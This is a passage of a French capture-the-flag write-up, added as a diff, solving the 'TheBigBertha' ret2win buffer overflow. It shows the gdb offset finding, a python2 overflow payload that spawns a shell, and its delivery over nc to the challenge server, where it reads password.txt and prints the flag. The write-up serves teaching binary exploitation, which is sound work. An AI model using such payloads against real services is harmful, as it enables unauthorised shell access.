@@ -98,3 +98,40 @@ Nous avons l'erreur de segmentation ! What's next ? Passons à l'exploitation !
 
 Avant toute chose, nous devons regarder l'adresse de la fonction `shell`, afin de pouvoir écraser l'adresse de retour avec l'adresse de `shell`.
 Un petit tour sur `gdb` (avec bien sûr `pwndbg` et pas `peda`) nous renseigne assez vite sur l'adresse de la fonction `shell`, dont la première instruction se situe à l'adresse `0x080491f6`.
+
+{: .box-note}
+**Note:** Il ne faudra pas oublier de mettre notre adresse en little endian ! Ce qui donnera `\xf6\x91\x04\x08` !
+
+On continue notre roadtrip sur `gdb` pour voir le padding nécessaire pour écraser le registre `EIP` avec la valeur de retour de notre adresse. Un outil très pratique, nommé `cyclic`, va nous permettre de faire cela.
+![gdb](https://cdn.discordapp.com/attachments/822188888297963560/1175418096203341855/Capture_decran_35.png?ex=656b2868&is=6558b368&hm=e5eb5a6ad597aabf5c434c57efbcb28d1f1c768443daad8286283ef594e333e1&){: .mx-auto.d-block :}
+
+Comme vous pouvez le voir, cyclic indique ici un offset de 76. On teste donc avec cette offset en utilisant python2, et non pas python3 (ce dernier a tendance à faire n'importe quoi, ce qui fait que votre payload, même si il est juste, ne marchera pas).
+```console
+blackraven@blackraven:~$ python2 -c 'print "A"*76+ "\xf6\x91\x04\x08" ' | ./TheBigBertha
+Entrez la cible :                                                                                                                                                                                               Delta Charlie. Ordre bien reçu.                                                                                                                                                                                 La cible est : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                                                                                                                                                                                                                                                                                     Segmentation fault
+```
+Et... il ne se passe rien. Est-ce qu'on a fait quelque chose de mal ? Non, ça ne se voit peut-être pas, mais notre payload marche. Un shell spawn, mais se referme immédiatement ! Il faut donc rajouter une commande, comme `cat`, permettant de garder le shell en vie.
+On recommence donc :
+```console
+blackraven@blackraven:~$ (python2 -c 'print "A"*76+ "\xf6\x91\x04\x08" '; cat) | ./TheBigBertha
+Entrez la cible :                                                                                                                                                                                               Delta Charlie. Ordre bien reçu.                                                                                                                                                                                 La cible est : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                                                                                                                                                                                                                                                                                     ls                                                                                                                                                                                                              TheBigBertha  TheBigBertha.c
+```
+Et ça marche ! Notre payload est fonctionnel en local, donc plus qu'à flagger en remote !
+![meme](https://cdn.discordapp.com/attachments/822188888297963560/1175421284990066738/86h9ua.jpg?ex=656b2b60&is=6558b660&hm=5b128794bcb338703cd29fecddb422aa9dc73366ab70f1919606146ea6ab1442&){: .mx-auto.d-block :}
+
+## Plus qu'à flag en remote !
+Il ne nous reste plus grand chose à faire maintenant. On se connecte donc en remote à `thebigbertha.nobrackets.fr` sur le port `30343`.
+```console
+blackraven@blackraven:~$ (python2 -c 'print "A"*76+ "\xf6\x91\x04\x08" '; cat) | nc thebigbertha.nobrackets.fr 30343
+Entrez la cible :                                                                                                                                                                                               Delta Charlie. Ordre bien reçu.                                                                                                                                                                                 La cible est : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                                                                                                                                                                                                                                                                                     ls                                                                                                                                                                                                              password.txt                                                                                                                                                                                                    pwn                                                                                                                                                                                                             cat password.txt                                                                                                                                                                                                NBCTF{4_M0r3_D1FF1CU17_0V3rF10W_66}                                                                                                                                                                             exit
+```
+
+On a notre flag : `NBCTF{4_M0r3_D1FF1CU17_0V3rF10W_66}` !
+Comme quoi, ça a du bon de crier "AAAAAA" sur La Grosse Bertha.
+
+![meme2](https://cdn.discordapp.com/attachments/811715744835567616/999765823356948520/hacker.png?ex=6568e7fb&is=655672fb&hm=8dc2cd9f820ac46f47c3965e792aa67804bb8d9e64eb2f523bb27e536c921c69&){: .mx-auto.d-block :}
+
+
+## Conclusion
+
+J'ai bien aimé ce challenge, que j'ai trouvé très sympa à faire étant donné que cela rappelle les basiques et la méthodo de l'exploitation de binaire. Un petit ret2win fort sympathique, qui ne présage que du bon pour la suite de la finale !
